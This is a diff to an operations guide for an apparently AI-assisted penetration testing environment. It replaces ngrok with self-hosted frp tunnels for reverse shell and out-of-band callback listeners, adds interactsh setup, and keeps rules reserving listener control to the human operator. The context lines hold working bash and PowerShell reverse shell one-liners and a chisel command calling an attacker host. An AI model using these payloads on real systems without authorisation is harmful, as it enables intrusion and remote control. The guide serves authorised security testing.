@@ -2,13 +2,12 @@
 
 ## Architecture
 
-Listeners (pwncat-vl, ngrok, chisel) are OPERATOR-CONTROLLED shared infrastructure.
+Listeners (pwncat-vl, frp, chisel) are OPERATOR-CONTROLLED shared infrastructure.
 Agents must never start them. The Kali runtime is shared across engagements — an agent
 starting a listener on port 4444 could conflict with another engagement's listener.
-ngrok tunnels are account-scoped — starting a second tunnel tears down the first.
 
 **Agent responsibility:** provide the exact commands in `# MANUAL:` playbook steps.
-**Operator responsibility:** execute them, then signal the agent to continue.
+**Operator responsibility:** execute them, record tunnel address in `$DIR/.listener_url`, then signal the agent to continue.
 
 ## pwncat-vl Listener Commands
 
@@ -76,18 +75,80 @@ engagement volume mount point.
 
 ## Exposing Listeners Externally
 
-### ngrok (installed)
+After starting a tunnel, **always record the public address** so agents can use it:
 ```bash
-# Expose pwncat listener on port 4444
-docker exec -e NGROK_AUTHTOKEN="$NGROK_AUTHTOKEN" \
-  -it security-research ngrok tcp 4444
+echo "PUBLIC_HOST:PUBLIC_PORT" > "$DIR/.listener_url"
 ```
-Note the public `host:port` from ngrok output and substitute it in reverse shell payloads.
+Agents read `LISTENER_HOST` and `LISTENER_PORT` from this file (or from dispatch context)
+instead of hardcoding tunnel addresses.
 
-**ngrok is account-scoped.** Most accounts allow one tunnel at a time. The operator
-must manage tunnel lifecycle — agents must not start or stop ngrok.
+### frp (primary — supports multiple simultaneous tunnels)
 
-### chisel / SSH tunnels / other forwarding (installed)
+frp is the preferred tunnel tool
+and is self-hosted (no account-scoped limitations, no data leaves your infrastructure).
+
+Three tunnels cover the standard engagement needs:
+
+| Tunnel | Local port | Purpose |
+|--------|-----------|---------|
+| `oob-https` | 8443 | HTTPS OOB callbacks (interactsh / blind vuln detection) |
+| `oob-dns` | 53 | DNS OOB callbacks |
+| `oob-rev` | 4444 | Reverse shell listener (pwncat) |
+
+#### SSH transport mode (preferred)
+
+frps accepts SSH connections directly — use the `ssh` command as the frpc transport.
+No separate frpc binary or config file needed on the client side.
+
+```bash
+# OOB HTTPS callback tunnel (port 8443)
+docker exec -it security-research tmux new-session -d -s frp-oob-https \
+  'ssh -o StrictHostKeyChecking=accept-new \
+    -R :8443:127.0.0.1:8443 \
+    YOUR_FRP_SSH_USER@YOUR_FRP_SERVER -p YOUR_FRP_SSH_PORT \
+    https \
+    --proxy_name oob-https \
+    --sd oob-https \ 
+    --remote_port 8443 \
+    --token YOUR_FRP_TOKEN 2>&1 | tee /data/frp-oob-https.log'
+
+# OOB DNS callback tunnel (port 53)
+docker exec -it security-research tmux new-session -d -s frp-oob-dns \
+  'ssh -o StrictHostKeyChecking=accept-new \
+    -R :53:127.0.0.1:53 \
+    YOUR_FRP_SSH_USER@YOUR_FRP_SERVER -p YOUR_FRP_SSH_PORT \
+    tcp \
+    --proxy_name oob-dns \
+    --remote_port 53 \
+    --token YOUR_FRP_TOKEN 2>&1 | tee /data/frp-oob-dns.log'
+
+# Reverse shell tunnel (port 4444)
+docker exec -it security-research tmux new-session -d -s frp-oob-rev \
+  'ssh -o StrictHostKeyChecking=accept-new \
+    -R :4444:127.0.0.1:4444 \
+    YOUR_FRP_SSH_USER@YOUR_FRP_SERVER -p YOUR_FRP_SSH_PORT \
+    tcp \
+    --proxy_name oob-rev \
+    --remote_port 4444 \
+    --token YOUR_FRP_TOKEN 2>&1 | tee /data/frp-oob-rev.log'
+
+# Record addresses
+echo "YOUR_FRP_SERVER:4444" > "$DIR/.listener_url"
+echo "YOUR_FRP_SERVER:8443" > "$DIR/.oob_url"
+```
+
+#### Direct TCP mode (alternative)
+
+If the frps server does not have SSH transport enabled, use `frpc` directly:
+
+```bash
+docker exec -it security-research tmux new-session -d -s frp-4444 \
+  'frpc tcp --server_addr YOUR_FRP_SERVER:7000 --local_port 4444 --remote_port 4444 2>&1 | tee /data/frp-4444.log'
+
+echo "YOUR_FRP_SERVER:4444" > "$DIR/.listener_url"
+```
+
+### chisel / SSH tunnels / other forwarding
 
 For detailed chisel, SSH tunnel, NTLM relay, and port forwarding commands, see
 `agent/references/offensive-tactics/lateral-movement/tunneling-relaying.md`.
@@ -98,9 +159,6 @@ docker exec -it security-research tmux new-session -d -s chisel-server \
   'chisel server --reverse --port 8080 2>&1 | tee /data/chisel.log'
 # Victim: chisel client ATTACKER_HOST:8080 R:4444:127.0.0.1:4444
 ```
-
-### frp (not installed)
-frp is not bundled. If the operator needs it, install manually.
 
 ## Reverse Shell Payloads
 
@@ -128,12 +186,48 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc LISTENER_HOST LISTENER_P
 powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('LISTENER_HOST',LISTENER_PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII.GetBytes($r)),0,$r.Length)};$c.Close()"
 ```
 
-## Integration with Existing Systems
+## OOB Callback Servers
 
-### HTTP callback listener (`start-callback`)
-The HTTP callback listener is for blind SSRF, OOB, and webhook validation — NOT for
-reverse shells. Use pwncat-vl for reverse shells and `start-callback` for HTTP callbacks.
-They are complementary.
+OOB (out-of-band) callbacks confirm blind vulnerabilities (SSRF, XXE, XSS, SQLi) by detecting
+outbound DNS/HTTP/SMTP requests from the target. This is separate from reverse shell listeners.
+
+**NEVER use the public `oast.fun` server for engagement work.** OOB callbacks can carry internal
+IPs, cloud metadata tokens, and credentials — sending those to third-party infrastructure is a
+data leak.
+
+### interactsh
+
+interactsh runs DNS (port 53) and HTTPS (port 8443) listeners for OOB callback detection.
+The frp tunnels above (`oob-dns` and `oob-https`) expose these to remote targets.
+
+**Local targets (lab network — targets can reach the Kali runtime directly):**
+```bash
+# interactsh-client: local polling mode (simplest — no custom domain needed)
+docker exec -it security-research tmux new-session -d -s oob-client \
+  'interactsh-client 2>&1 | tee /data/oob-client.log'
+# The client prints a unique callback URL on startup — record it in $DIR/.oob_url
+```
+
+**Remote targets (interactsh needs to be publicly reachable):**
+```bash
+# interactsh-server: self-hosted (requires a domain you control)
+docker exec -it security-research tmux new-session -d -s oob-server \
+  'interactsh-server -d your-callback-domain.com 2>&1 | tee /data/oob-server.log'
+```
+
+Then start the frp SSH tunnels for `oob-dns` (53) and `oob-https` (8443) as shown above.
+
+After provisioning, record the callback URL:
+```bash
+echo "YOUR_OOB_CALLBACK_URL" > "$DIR/.oob_url"
+```
+
+### Checking for callbacks
+```bash
+docker exec security-research tail -50 /data/oob-client.log
+```
+
+## Integration with Existing Systems
 
 ### Metasploit (optional sidecar)
 MSF remains available for exploit modules (gadget generation, specific CVE exploits).
@@ -145,7 +239,7 @@ when running alongside the primary Kali runtime.
 
 Agents **MUST NOT:**
 - Start `pwncat`, `nc -lvp`, `socat` as a listener, or any listening socket
-- Start `ngrok`, `frp`, or `chisel server`
+- Start `frp`, or `chisel server`
 - Kill or restart existing listener or tunnel sessions
 
 Agents **CAN:**
